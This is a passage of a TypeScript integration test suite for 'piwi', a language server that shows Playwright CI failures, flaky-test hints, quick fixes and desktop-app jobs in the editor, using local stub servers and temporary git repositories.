  test('a run chosen by its id, kept by the client, is read from the start, with the branches to choose from', async () => {
    const status = await statusWith('CI run #118 on feature/x');
    expect(status).toMatchObject({
      branch: 'feature/x',
      run: { id: 118 },
      baseline: { choice: { kind: 'run', runId: 118 } },
      branches: ['main', 'feature/x'],
    });
    const failures = (await baselineClient.sendRequest('piwi/failures')) as FailuresResult;
    expect(failures.items.map((f) => f.executionId)).toEqual([1180]);
    expect(failures.baseline).toEqual({ choice: { kind: 'run', runId: 118 }, label: 'CI run #118 on feature/x' });
  });

  test('a run on a developer’s machine chosen as the baseline lists its failures as local ones', async () => {
    await choose({ kind: 'run', runId: 119 }, 'local run #119 on main');
    const failures = (await baselineClient.sendRequest('piwi/failures')) as FailuresResult;
    expect(failures.items).toMatchObject([{ executionId: 1190, runId: 119, source: 'local' }]);
    const onPage = await waitFor(() =>
      baselinePublished.get(uri('tests/pages/checkout.page.ts'))?.find((d) => d.message.includes('#119')),
    );
    expect(onPage.message).toBe("locator('.cart-row').nth(2) was not found (removes a row, local run #119)");
    const hover = (await baselineClient.sendRequest('textDocument/hover', {
      textDocument: { uri: uri('tests/pages/checkout.page.ts') },
      position: { line: 4, character: 30 },
    })) as { contents: { value: string } };
    expect(hover.contents.value).toContain(
      `**Local failure** · [removes a row](${url}/test-run-cases/1190) · local run #119`,
    );
  });

  test('the ladder reads the checked-out branch, as without a choice', async () => {
    const { status, reads } = await choose({ kind: 'ladder' }, 'CI run #41 on main');
    expect(status).toMatchObject({ branch: 'main', checkedOut: 'main', run: { id: 41 } });
    expect(reads).toEqual([{ branch: 'main', overlays: '1' }]);
  });

  test('a branch reads its latest run, and one with no run says so and reads nothing else', async () => {
    const chosen = await choose({ kind: 'branch', branch: 'feature/x' }, 'CI run #120 on feature/x');
    expect(chosen.status).toMatchObject({ branch: 'feature/x', checkedOut: 'main', run: { id: 120 }, failures: 0 });
    expect(chosen.reads).toEqual([{ branch: 'feature/x', overlays: '1' }]);

    const none = await choose({ kind: 'branch', branch: 'release' }, 'release (no run)');
    expect(none.status).toMatchObject({ branch: 'release', run: null, failures: 0 });
    expect(none.reads).toEqual([{ branch: 'release', overlays: '1' }]);
  });

  test('a run the instance does not hold says so', async () => {
    const { status, reads } = await choose({ kind: 'run', runId: 999 }, 'run #999 (no run)');
    expect(status).toMatchObject({ run: null, failures: 0 });
    expect(reads).toEqual([{ overlays: '1', run: '999' }]);
  });

  test("a developer's own runs only: the overlays alone, as local failures, with no baseline", async () => {
    const { status, reads } = await choose({ kind: 'local' }, 'your local runs only');
    expect(status).toMatchObject({ branch: 'main', run: null, failures: 1, overlays: 1 });
    expect(reads).toEqual([{ branch: 'main', overlays: '1', origin: 'local' }]);
    const failures = (await baselineClient.sendRequest('piwi/failures')) as FailuresResult;
    expect(failures.run).toBeNull();
    expect(failures.overlays?.map((o) => o.id)).toEqual([60]);
    expect(failures.items).toMatchObject([{ executionId: 600, runId: 60, source: 'local', isNew: true }]);
    expect(failures.baseline?.label).toBe('your local runs only');
  });

  test('the choice survives credentials that carry it, and credentials that name none bring the ladder back', async () => {
    await choose({ kind: 'branch', branch: 'feature/x' }, 'CI run #120 on feature/x');
    const from = baselineReads.length;
    await baselineClient.sendNotification('piwi/setCredentials', {
      baselines: { [dir]: { kind: 'branch', branch: 'feature/x' } },
    });
    await waitFor(() => (baselineReads.length > from ? true : undefined));
    expect((await statusWith('CI run #120 on feature/x')).run?.id).toBe(120);
    expect(baselineReads.slice(from).map((q) => q.get('branch'))).toEqual(['feature/x']);

    await baselineClient.sendNotification('piwi/setCredentials', {});
    await waitFor(() => (baselineReads.length > from + 1 ? true : undefined));
    expect((await statusWith('CI run #120 on feature/x')).baseline?.choice).toEqual({
      kind: 'branch',
      branch: 'feature/x',
    });

    await baselineClient.sendNotification('piwi/setCredentials', { baselines: {} });
    expect((await statusWith('CI run #41 on main')).baseline?.choice).toEqual({ kind: 'ladder' });
  });
});

describe('an instance slow to answer the indexes', () => {
  let slowClient: MessageConnection;
  let stopSlow: () => void;
  const slowPublished = new Map<string, Array<{ message: string; code?: string }>>();
  const selectionsOf = async () =>
    ((await slowClient.sendRequest('piwi/selections', { uri: uri('tests/checkout.spec.ts') })) as { items: unknown[] })
      .items;

  beforeAll(async () => {
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    stopSlow = startServer(createConnection(toServer, toClient), {
      env: {
        PIWI_DASHBOARD_URL: url,
        PIWI_PROJECT_NAME: 'Acme Mugs',
        PIWI_API_KEY: SLOW_KEY,
        PIWI_DESKTOP_CONFIG: '/nonexistent',
      },
      debounceMs: 10,
      runPollMs: 60 * 60_000,
    });
    slowClient = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    slowClient.onNotification('textDocument/publishDiagnostics', (p: { uri: string; diagnostics: [] }) => {
      slowPublished.set(p.uri, p.diagnostics);
    });
    slowClient.listen();
    await slowClient.sendRequest('initialize', {
      processId: null,
      rootUri: null,
      capabilities: {},
      workspaceFolders: [{ uri: pathToFileURL(dir).href, name: 'shop' }],
    });
    await slowClient.sendNotification('initialized', {});
  });

  afterAll(() => {
    releaseSlow?.();
    stopSlow?.();
    slowClient?.dispose();
  });

  test('the latest run’s failures show while the indexes read after it are still on their way', async () => {
    const failure = await waitFor(() =>
      [...slowPublished.values()].flat().find((d) => d.code === 'ci-failure' && d.message.includes('#41')),
    );
    expect(failure.message).toBe("locator('.cart-row').nth(2) was not found (removes a row, run #41)");
    // The flake-lab and selections reads are still held.
    await waitFor(() => (slowHeld >= 2 ? true : undefined));
    expect(releaseSlow).not.toBeNull();
    const status = (await slowClient.sendRequest('piwi/status')) as StatusResult;
    expect(status.contexts[0]).toMatchObject({ connected: true, projectName: 'Acme Mugs', problem: null });
    expect(await selectionsOf()).toEqual([]);
  });

  test('an instance that neither resolves the selections together nor lists search values is read as before', async () => {
    releaseSlow!();
    releaseSlow = null;
    const items = await waitFor(async () => {
      const listed = await selectionsOf();
      return listed.length ? listed : undefined;
    });
    expect(items).toEqual([
      { key: 'smoke', name: 'Smoke', count: 1, includesFile: true },
      { key: 'failed', name: 'failed', count: 1, includesFile: false },
    ]);
    const text =
      "import { test } from '@playwright/test';\n\ntest('pays', { tag: ['@sm'] }, async ({ page }) => {});\n";
    await slowClient.sendNotification('textDocument/didOpen', {
      textDocument: { uri: uri('tests/checkout.spec.ts'), languageId: 'typescript', version: 1, text },
    });
    const tags = (await slowClient.sendRequest('textDocument/completion', {
      textDocument: { uri: uri('tests/checkout.spec.ts') },
      position: { line: 2, character: text.split('\n')[2]!.indexOf("'@sm'") + 4 },
    })) as Array<{ label: string }>;
    expect(tags.map((i) => i.label)).toEqual(['@checkout', '@smoke']);
  });
});

describe('a branch with no run yet', () => {
  test('shows the default branch’s latest run, and says which branch it is', async () => {
    const other = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'piwi-editor-branch-')));
    fs.cpSync(dir, other, { recursive: true, filter: (src) => !src.split(path.sep).includes('.git') });
    const git = (...args: string[]) =>
      execFileSync('git', ['-c', 'user.email=t@example.com', '-c', 'user.name=t', ...args], {
        cwd: other,
        stdio: 'ignore',
      });
    git('init', '-q', '-b', 'feature/new-cart');
    git('add', '.');
    git('commit', '-q', '-m', 'init');
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    const stopBranch = startServer(createConnection(toServer, toClient), {
      env: { PIWI_DASHBOARD_URL: url, PIWI_PROJECT_NAME: 'Acme Mugs', PIWI_DESKTOP_CONFIG: '/nonexistent' },
      debounceMs: 10,
    });
    const branchClient = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    const published = new Map<string, Array<{ message: string; severity?: number }>>();
    branchClient.onNotification('textDocument/publishDiagnostics', (p: { uri: string; diagnostics: [] }) => {
      published.set(p.uri, p.diagnostics);
    });
    branchClient.listen();
    try {
      await branchClient.sendRequest('initialize', {
        processId: null,
        rootUri: null,
        capabilities: {},
        workspaceFolders: [{ uri: pathToFileURL(other).href, name: 'shop' }],
      });
      await branchClient.sendNotification('initialized', {});
      const status = await waitFor(async () => {
        const s = (await branchClient.sendRequest('piwi/runStatus')) as RunStatusResult;
        return s.contexts[0]?.run ? s : undefined;
      });
      expect(status.contexts[0]).toMatchObject({ branch: 'main', checkedOut: 'feature/new-cart', run: { id: 41 } });
      const page = pathToFileURL(path.join(other, 'tests/pages/checkout.page.ts')).href;
      const onPage = await waitFor(() => published.get(page));
      expect(onPage[0]?.message).toContain('run #41 on main');
      // Another branch's failure is a warning at most, and an information when the setting says so.
      expect(onPage[0]?.severity).toBe(2);
      const severityAfter = async (failureSeverity: string, severity: number) => {
        await branchClient.sendNotification('piwi/setCredentials', { failureSeverity });
        await waitFor(() => (published.get(page)?.[0]?.severity === severity ? true : undefined));
      };
      await severityAfter('information', 3);
      await severityAfter('error', 2);
    } finally {
      stopBranch();
      branchClient.dispose();
      fs.rmSync(other, { recursive: true, force: true });
    }
  });
});

describe('the severity of a failure', () => {
  test('follows the setting, and off publishes no diagnostic while the failure is still listed and drawn', async () => {
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    const stopSeverity = startServer(createConnection(toServer, toClient), {
      env: { PIWI_DASHBOARD_URL: url, PIWI_PROJECT_NAME: 'Acme Mugs', PIWI_DESKTOP_CONFIG: '/nonexistent' },
      debounceMs: 10,
    });
    const severityClient = createMessageConnection(
      new StreamMessageReader(toClient),
      new StreamMessageWriter(toServer),
    );
    const published = new Map<string, Array<{ code?: string; severity?: number }>>();
    severityClient.onNotification('textDocument/publishDiagnostics', (p: { uri: string; diagnostics: [] }) => {
      published.set(p.uri, p.diagnostics);
    });
    severityClient.listen();
    const page = uri('tests/pages/checkout.page.ts');
    const failure = () => published.get(page)?.find((d) => d.code === 'ci-failure');
    try {
      await severityClient.sendRequest('initialize', {
        processId: null,
        rootUri: null,
        capabilities: {},
        workspaceFolders: [{ uri: pathToFileURL(dir).href, name: 'shop' }],
        initializationOptions: { credentials: { failureSeverity: 'warning' } },
      });
      await severityClient.sendNotification('initialized', {});
      expect((await waitFor(failure)).severity).toBe(2);

      await severityClient.sendNotification('piwi/setCredentials', { failureSeverity: 'off' });
      await waitFor(() => (published.has(page) && !failure() ? true : undefined));
      const listed = (await severityClient.sendRequest('piwi/failures', null)) as FailuresResult;
      expect(listed.items.map((i) => i.title)).toEqual(['removes a row']);
      const spec = (await severityClient.sendRequest('piwi/fileSummary', {
        uri: uri('tests/rows.spec.ts'),
      })) as FileSummary;
      expect(spec.lines.find((l) => l.line === 3)).toMatchObject({ status: 'failed', failure: { line: 6 } });

      // Credentials without the setting: an error, as for a run on the checked-out branch.
      await severityClient.sendNotification('piwi/setCredentials', {});
      await waitFor(() => (failure()?.severity === 1 ? true : undefined));
    } finally {
      stopSeverity();
      severityClient.dispose();
    }
  });
});

describe('a checkout or a commit', () => {
  test('is read within seconds: the latest run and the locators a change breaks follow the new HEAD', async () => {
    const other = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'piwi-editor-head-')));
    fs.cpSync(dir, other, { recursive: true, filter: (src) => !src.split(path.sep).includes('.git') });
    const git = (...args: string[]) =>
      execFileSync('git', ['-c', 'user.email=t@example.com', '-c', 'user.name=t', ...args], {
        cwd: other,
        stdio: 'ignore',
      });
    git('init', '-q', '-b', 'main');
    git('add', '.');
    git('commit', '-q', '-m', 'init');
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    const stopHead = startServer(createConnection(toServer, toClient), {
      env: { PIWI_DASHBOARD_URL: url, PIWI_PROJECT_NAME: 'Acme Mugs', PIWI_DESKTOP_CONFIG: '/nonexistent' },
      debounceMs: 10,
      // Neither within the test: what the service reads again, it reads when HEAD moves.
      refreshMs: 60 * 60_000,
      runPollMs: 60 * 60_000,
      gitWatchMs: 20,
    });
    const headClient = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    const statuses: RunStatusResult[] = [];
    const published = new Map<string, Array<{ message: string; code?: string }>>();
    headClient.onNotification('piwi/runStatusChanged', (p: RunStatusResult) => {
      statuses.push(p);
    });
    headClient.onNotification('textDocument/publishDiagnostics', (p: { uri: string; diagnostics: [] }) => {
      published.set(p.uri, p.diagnostics);
    });
    headClient.listen();
    const component = pathToFileURL(path.join(other, 'src/components/CheckoutButton.vue')).href;
    try {
      await headClient.sendRequest('initialize', {
        processId: null,
        rootUri: null,
        capabilities: {},
        workspaceFolders: [{ uri: pathToFileURL(other).href, name: 'shop' }],
      });
      await headClient.sendNotification('initialized', {});
      await waitFor(async () => {
        const s = (await headClient.sendRequest('piwi/status')) as StatusResult;
        return s.contexts[0]?.connected && s.contexts[0].reachedFiles > 0 ? true : undefined;
      });
      const first = await waitFor(async () => {
        const s = (await headClient.sendRequest('piwi/runStatus')) as RunStatusResult;
        return s.contexts[0]?.run ? s : undefined;
      });
      expect(first.contexts[0]).toMatchObject({ branch: 'main', checkedOut: 'main', run: { id: 41 } });

      // A rename in the open file breaks a locator, against the file as HEAD holds it.
      const renamed = COMPONENT.replace('Pay now', 'Pay');
      await headClient.sendNotification('textDocument/didOpen', {
        textDocument: { uri: component, languageId: 'vue', version: 1, text: renamed },
      });
      const broken = await waitFor(() => published.get(component)?.find((d) => d.code === 'locator-break'));
      expect(broken.message).toContain('"Pay now" → "Pay"');

      // Committed, the rename breaks nothing: HEAD holds it.
      fs.writeFileSync(path.join(other, 'src/components/CheckoutButton.vue'), renamed);
      const committedAt = Date.now();
      git('commit', '-q', '-am', 'rename');
      await waitFor(() => (published.get(component)?.length === 0 ? true : undefined));
      expect(Date.now() - committedAt).toBeLessThan(3_000);

      // Checked out, a branch without a run shows the default branch's run, and says which branch is checked out.
      const checkedOutAt = Date.now();
      git('checkout', '-q', '-b', 'feature/switch');
      const switched = await waitFor(() => statuses.find((s) => s.contexts[0]?.checkedOut === 'feature/switch'));
      expect(Date.now() - checkedOutAt).toBeLessThan(3_000);
      expect(switched.contexts[0]).toMatchObject({ branch: 'main', checkedOut: 'feature/switch', run: { id: 41 } });
    } finally {
      stopHead();
      headClient.dispose();
      fs.rmSync(other, { recursive: true, force: true });
    }
  });
});

describe('the desktop app chosen with Connect', () => {
  test('comes before the instance the environment names, which the status keeps, and says so', async () => {
    const desktopFile = path.join(dir, '.desktop-chosen.json');
    fs.writeFileSync(desktopFile, JSON.stringify({ url, token: 'pd_desktop', projects: [{ id: 7, path: dir }] }));
    // The team's instance, not reachable from here.
    const team = 'http://127.0.0.1:9';
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    const stopChosen = startServer(createConnection(toServer, toClient), {
      env: { PIWI_DASHBOARD_URL: team, PIWI_DESKTOP_CONFIG: desktopFile },
      debounceMs: 10,
    });
    const chosenClient = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    const notified: StatusResult[] = [];
    chosenClient.onNotification('piwi/statusChanged', (s: StatusResult) => {
      notified.push(s);
    });
    chosenClient.listen();
    try {
      await chosenClient.sendRequest('initialize', {
        processId: null,
        rootUri: null,
        capabilities: {},
        workspaceFolders: [{ uri: pathToFileURL(dir).href, name: 'shop' }],
      });
      await chosenClient.sendNotification('initialized', {});
      const before = await waitFor(() => notified.find((s) => s.contexts[0]?.problem));
      expect(before.contexts[0]).toMatchObject({ source: 'environment', serverUrl: team, connected: false });
      expect(before.desktopUrl).toBe(url);

      await chosenClient.sendNotification('piwi/setCredentials', { desktop: true });
      const after = await waitFor(() => notified.find((s) => s.contexts[0]?.connected));
      expect(after.contexts[0]).toMatchObject({
        source: 'desktop',
        serverUrl: url,
        projectName: 'Acme Mugs',
        instance: { serverUrl: team, source: 'environment' },
      });
    } finally {
      fs.rmSync(desktopFile, { force: true });
      stopChosen();
      chosenClient.dispose();
    }
  });
});

describe('what keeps a context from the instance’s data', () => {
  /** An instance between the service and the stub: down, refusing every key, or the stub with an ETag on its index. */
  let mode: 'down' | 'refused' | 'up' = 'refused';
  /** The failures' healing: an error of the instance, held until released, or answered by the stub. */
  let healing: 'down' | 'held' | 'up' = 'up';
  let releaseHealing: (() => void) | null = null;
  const asked: string[] = [];
  let gate: http.Server;
  let gateUrl = '';

  beforeAll(async () => {
    gate = http.createServer((req, res) => {
      if (mode !== 'up') {
        res.statusCode = mode === 'down' ? 503 : 401;
        return res.end('{}');
      }
      if (/^\/api\/test-run-cases\/\d+\/locator-healing/.test(req.url ?? '') && healing !== 'up') {
        if (healing === 'down') {
          res.statusCode = 503;
          return res.end('{}');
        }
        const held = new Promise<void>((resolve) => (releaseHealing = resolve));
        void held.then(() => server.emit('request', req, res));
        return;
      }
      if ((req.url ?? '').startsWith('/api/projects/7/locator-index')) {
        const etag = req.headers['if-none-match'];
        if (etag) asked.push(String(etag));
        if (etag === '"index-1"') {
          res.statusCode = 304;
          return res.end();
        }
        res.setHeader('ETag', '"index-1"');
      }
      server.emit('request', req, res);
    });
    await new Promise<void>((resolve) => gate.listen(0, '127.0.0.1', resolve));
    gateUrl = `http://127.0.0.1:${(gate.address() as AddressInfo).port}`;
  });

  afterAll(() => {
    gate.close();
  });

  test('is told apart, an instance that does not answer is read again soon, and an unchanged index is not', async () => {
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    const stopGate = startServer(createConnection(toServer, toClient), {
      env: { PIWI_DASHBOARD_URL: gateUrl, PIWI_PROJECT_NAME: 'Acme Mugs', PIWI_DESKTOP_CONFIG: '/nonexistent' },
      debounceMs: 10,
      runPollMs: 60 * 60_000,
      unreachableRetryMs: 50,
    });
    const gateClient = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    const notified: StatusResult[] = [];
    gateClient.onNotification('piwi/statusChanged', (s: StatusResult) => {
      notified.push(s);
    });
    gateClient.listen();
    const last = () => notified[notified.length - 1]?.contexts[0];
    try {
      await gateClient.sendRequest('initialize', {
        processId: null,
        rootUri: null,
        capabilities: {},
        workspaceFolders: [{ uri: pathToFileURL(dir).href, name: 'shop' }],
      });
      await gateClient.sendNotification('initialized', {});
      const refused = await waitFor(() => (last()?.problemKind === 'refused' ? last() : undefined));
      expect(refused).toMatchObject({ connected: false, serverUrl: gateUrl });
      expect(refused!.problem).toContain('needs an API key (401)');

      mode = 'down';
      await gateClient.sendRequest('piwi/refresh');
      const down = await waitFor(() => (last()?.problemKind === 'unreachable' ? last() : undefined));
      expect(down!.problem).toContain(`Could not reach ${gateUrl}`);

      // No refresh asked: the service reads the instance again on its own, soon.
      mode = 'up';
      const up = await waitFor(() => (last()?.connected ? last() : undefined));
      expect(up).toMatchObject({ projectName: 'Acme Mugs', problem: null, problemKind: null });
      expect(asked).toEqual([]);

      await gateClient.sendRequest('piwi/refresh');
      expect(asked).toContain('"index-1"');
      const status = (await gateClient.sendRequest('piwi/status')) as StatusResult;
      expect(status.contexts[0]).toMatchObject({ connected: true, locators: up!.locators });
      expect(up!.locators).toBeGreaterThan(0);
    } finally {
      stopGate();
      gateClient.dispose();
    }
  });

  test('a quick fix waits for the instance a while at most, and asks again what failed', async () => {
    mode = 'up';
    healing = 'down';
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    const stopGate = startServer(createConnection(toServer, toClient), {
      env: { PIWI_DASHBOARD_URL: gateUrl, PIWI_PROJECT_NAME: 'Acme Mugs', PIWI_DESKTOP_CONFIG: '/nonexistent' },
      debounceMs: 10,
      runPollMs: 60 * 60_000,
      lookupWaitMs: 200,
    });
    const gateClient = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    type Published = { code?: string; range: unknown };
    const published = new Map<string, Published[]>();
    gateClient.onNotification('textDocument/publishDiagnostics', (p: { uri: string; diagnostics: Published[] }) => {
      published.set(p.uri, p.diagnostics);
    });
    gateClient.listen();
    try {
      await gateClient.sendRequest('initialize', {
        processId: null,
        rootUri: null,
        capabilities: {},
        workspaceFolders: [{ uri: pathToFileURL(dir).href, name: 'shop' }],
      });
      await gateClient.sendNotification('initialized', {});
      const page = uri('tests/pages/checkout.page.ts');
      await gateClient.sendNotification('textDocument/didOpen', {
        textDocument: { uri: page, languageId: 'typescript', version: 1, text: PAGE_OBJECT },
      });
      const failure = await waitFor(() => published.get(page)?.find((d) => d.code === 'ci-failure'));
      const titles = async () =>
        (
          (await gateClient.sendRequest('textDocument/codeAction', {
            textDocument: { uri: page },
            range: failure.range,
            context: { diagnostics: [failure] },
          })) as Array<{ title: string }>
        ).map((a) => a.title);
      const heal = "Heal: use getByRole('row', { name: /Mug/ })";

      expect(await titles()).not.toContain(heal);
      // What failed is asked again, and waited for a while at most.
      healing = 'held';
      const start = Date.now();
      expect(await titles()).not.toContain(heal);
      expect(Date.now() - start).toBeLessThan(2_000);
      expect(releaseHealing).not.toBeNull();
      healing = 'up';
      releaseHealing!();
      await waitFor(async () => ((await titles()).includes(heal) ? true : undefined));
    } finally {
      releaseHealing?.();
      healing = 'up';
      stopGate();
      gateClient.dispose();
    }
  });
});

describe('the configs of one repository reading one project', () => {
  let downloads = 0;
  /** The reads of the project's latest run and of its flaky tests, by route. */
  const reads = new Map<string, number>();
  let gate: http.Server;
  let repo = '';
  let twoClient: MessageConnection;
  let stopTwo: () => void;

  beforeAll(async () => {
    gate = http.createServer((req, res) => {
      const read = /^\/api\/projects\/7\/(branch-failures|flaky-tests)\b/.exec(req.url ?? '')?.[1];
      if (read) reads.set(read, (reads.get(read) ?? 0) + 1);
      if ((req.url ?? '').startsWith('/api/projects/7/locator-index')) {
        if (req.headers['if-none-match'] === '"shared-1"') {
          res.statusCode = 304;
          return res.end();
        }
        downloads++;
        res.setHeader('ETag', '"shared-1"');
      }
      server.emit('request', req, res);
    });
    await new Promise<void>((resolve) => gate.listen(0, '127.0.0.1', resolve));
    const gateUrl = `http://127.0.0.1:${(gate.address() as AddressInfo).port}`;
    repo = fs.mkdtempSync(path.join(os.tmpdir(), 'piwi-two-configs-'));
    const files: Record<string, string> = {
      'playwright.config.ts': 'export default {};\n',
      'tests/rows.spec.ts': "import { test } from '@playwright/test';\n\ntest('removes a row', async () => {});\n",
      'tests/pages/checkout.page.ts': PAGE_OBJECT,
      'admin/playwright.config.ts': 'export default {};\n',
    };
    for (const [file, text] of Object.entries(files)) {
      fs.mkdirSync(path.dirname(path.join(repo, file)), { recursive: true });
      fs.writeFileSync(path.join(repo, file), text);
    }
    // One repository: the admin config finds the failure's page object from the repository's root too.
    execFileSync('git', ['init', '-q'], { cwd: repo });
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    stopTwo = startServer(createConnection(toServer, toClient), {
      env: { PIWI_DASHBOARD_URL: gateUrl, PIWI_PROJECT_NAME: 'Acme Mugs', PIWI_DESKTOP_CONFIG: '/nonexistent' },
      debounceMs: 10,
      runPollMs: 60 * 60_000,
    });
    twoClient = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    twoClient.listen();
    await twoClient.sendRequest('initialize', {
      processId: null,
      rootUri: null,
      capabilities: {},
      workspaceFolders: [{ uri: pathToFileURL(repo).href, name: 'two' }],
    });
    await twoClient.sendNotification('initialized', {});
  });

  afterAll(() => {
    stopTwo?.();
    twoClient?.dispose();
    gate?.close();
    fs.rmSync(repo, { recursive: true, force: true });
  });

  test('download its locator index once, and show each failure once, from the config of its spec', async () => {
    const status = await waitFor(async () => {
      const s = (await twoClient.sendRequest('piwi/status')) as StatusResult;
      return s.contexts.length === 2 && s.contexts.every((c) => c.connected) ? s : undefined;
    });
    expect(status.contexts.map((c) => c.locators)).toEqual([2, 2]);
    expect(downloads).toBe(1);
    const failures = (await twoClient.sendRequest('piwi/failures')) as FailuresResult;
    const shown = failures.items.filter((f) => f.title === 'removes a row');
    expect(shown.map((f) => [f.root, f.uri])).toEqual([
      [repo, pathToFileURL(path.join(repo, 'tests/pages/checkout.page.ts')).href],
    ]);
  });

  test('list the failures under a node per config, each with its own run, named by its folder', async () => {
    const admin = path.join(repo, 'admin');
    const status = (await twoClient.sendRequest('piwi/status')) as StatusResult;
    expect(status.contexts.map((c) => [c.root, c.label])).toEqual([
      [repo, path.basename(repo)],
      [admin, 'admin'],
    ]);
    const failures = (await twoClient.sendRequest('piwi/failures')) as FailuresResult;
    expect(failures.tree.map((n) => [n.key, n.kind, n.label, n.description, n.root])).toEqual([
      [`context:${repo}`, 'context', path.basename(repo), 'Acme Mugs · 1 failing', repo],
      [`context:${admin}`, 'context', 'admin', 'Acme Mugs · 0 failing', admin],
    ]);
    const leaves = (nodes: FailuresResult['tree']): FailuresResult['tree'] =>
      nodes.flatMap((n) => (n.kind === 'failure' ? [n] : leaves(n.children)));
    const [shop, other] = failures.tree;
    expect(leaves([shop!]).map((n) => n.label)).toEqual(['removes a row']);
    // The admin config holds none of the run's failures: its run alone.
    expect(other!.children.map((n) => [n.key, n.kind, n.root])).toEqual([[`context:${admin}\nrun`, 'run', admin]]);
    expect(leaves([other!])).toEqual([]);
    expect(failures).toMatchObject({ runLabel: null, failing: 1 });
    expect(failures).not.toHaveProperty('run');
  });

  test('read its latest run and its flaky tests once for the refresh they make together', async () => {
    await waitFor(() => reads.get('flaky-tests'));
    // The other config's read, on its way or answered a moment before, is the same one.
    await new Promise((resolve) => setTimeout(resolve, 300));
    expect(Object.fromEntries(reads)).toEqual({ 'branch-failures': 1, 'flaky-tests': 1 });
  });
});

describe('a change pushed to the client', () => {
  test('is a change from what the client read: a desktop app a read saw, gone since, is said gone', async () => {
    const desktopFile = path.join(dir, '.desktop-seen.json');
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    const stopSeen = startServer(createConnection(toServer, toClient), {
      env: { PIWI_DASHBOARD_URL: url, PIWI_PROJECT_NAME: 'Acme Mugs', PIWI_DESKTOP_CONFIG: desktopFile },
      debounceMs: 10,
      // The discovery file is not watched here: only the read sees the app.
      desktopWatchMs: 60_000,
    });
    const seen = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    const notified: StatusResult[] = [];
    seen.onNotification('piwi/statusChanged', (s: StatusResult) => {
      notified.push(s);
    });
    seen.listen();
    try {
      await seen.sendRequest('initialize', {
        processId: null,
        rootUri: null,
        capabilities: {},
        workspaceFolders: [{ uri: pathToFileURL(dir).href, name: 'shop' }],
      });
      await seen.sendNotification('initialized', {});
      await waitFor(() => notified.find((s) => s.contexts[0]?.connected));
      fs.writeFileSync(desktopFile, JSON.stringify({ url: 'http://127.0.0.1:9', token: 'pd_desktop', projects: [] }));
      const read = (await seen.sendRequest('piwi/status')) as StatusResult;
      expect(read.desktopUrl).toBe('http://127.0.0.1:9');
      fs.rmSync(desktopFile);
      const before = notified.length;
      // The same status as the last one pushed, but not as the last one read.
      await seen.sendNotification('piwi/setCredentials', {});
      const after = await waitFor(() => notified.slice(before).find((s) => s.desktopUrl === null));
      expect(after.contexts[0]).toMatchObject({ connected: true, projectName: 'Acme Mugs' });
    } finally {
      fs.rmSync(desktopFile, { force: true });
      stopSeen();
      seen.dispose();
    }
  });
});

describe('jobs for the desktop app running beside a team instance', () => {
  test('offer Flake Lab on a flaky test and on a failure whose test has an untested suspect', async () => {
    const desktopFile = path.join(dir, '.desktop-beside.json');
    // The app runs, but the environment names the team instance, which the context reads.
    fs.writeFileSync(desktopFile, JSON.stringify({ url: 'http://127.0.0.1:9', token: 'pd_desktop', projects: [] }));
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    const stopBeside = startServer(createConnection(toServer, toClient), {
      env: { PIWI_DASHBOARD_URL: url, PIWI_PROJECT_NAME: 'Acme Mugs', PIWI_DESKTOP_CONFIG: desktopFile },
      debounceMs: 10,
    });
    const beside = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    const published = new Map<string, Array<{ code?: string; range: unknown; source?: string }>>();
    beside.onNotification('textDocument/publishDiagnostics', (p: { uri: string; diagnostics: never[] }) => {
      published.set(p.uri, p.diagnostics);
    });
    beside.listen();
    const openHere = (file: string, text: string) =>
      beside.sendNotification('textDocument/didOpen', {
        textDocument: { uri: uri(file), languageId: 'typescript', version: 1, text },
      });
    try {
      await beside.sendRequest('initialize', {
        processId: null,
        rootUri: null,
        capabilities: {},
        workspaceFolders: [{ uri: pathToFileURL(dir).href, name: 'shop' }],
      });
      await beside.sendNotification('initialized', {});
      await openHere('tests/checkout.spec.ts', fs.readFileSync(path.join(dir, 'tests/checkout.spec.ts'), 'utf8'));
      await openHere('tests/pages/checkout.page.ts', PAGE_OBJECT);

      const lines = await waitFor(async () => {
        const summary = (await beside.sendRequest('piwi/fileSummary', {
          uri: uri('tests/checkout.spec.ts'),
        })) as FileSummary;
        return summary.lines.some((l) => l.command?.command === 'piwi.desktopJob') ? summary.lines : undefined;
      });
      expect(lines.map((l) => l.title).slice(-4)).toEqual([
        'flaky 18% · top suspect: slow GET /api/cart (reproduced 7 of 10)',
        'Reproduce this flake',
        'Reproduce this flake in the desktop app',
        'Verify the flake fix',
      ]);
      expect(lines.find((l) => l.command?.command === 'piwi.desktopJob')!.command).toEqual({
        title: 'Reproduce this flake in the desktop app',
        command: 'piwi.desktopJob',
        arguments: [{ root: dir, testCaseId: 1, kind: 'flake-lab' }],
      });

      const failure = await waitFor(() =>
        published.get(uri('tests/pages/checkout.page.ts'))?.find((d) => d.code === 'ci-failure'),
      );
      const actions = (await beside.sendRequest('textDocument/codeAction', {
        textDocument: { uri: uri('tests/pages/checkout.page.ts') },
        range: failure.range,
        context: { diagnostics: [failure] },
      })) as Array<{ title: string; command?: { command: string; arguments: unknown[] } }>;
      const jobs = actions.filter((a) => a.command?.command === 'piwi.desktopJob');
      expect(jobs.map((a) => [a.title, a.command!.arguments[0]])).toEqual([
        ['Reproduce in the desktop app', { root: dir, executionId: 900, kind: 'reproduce' }],
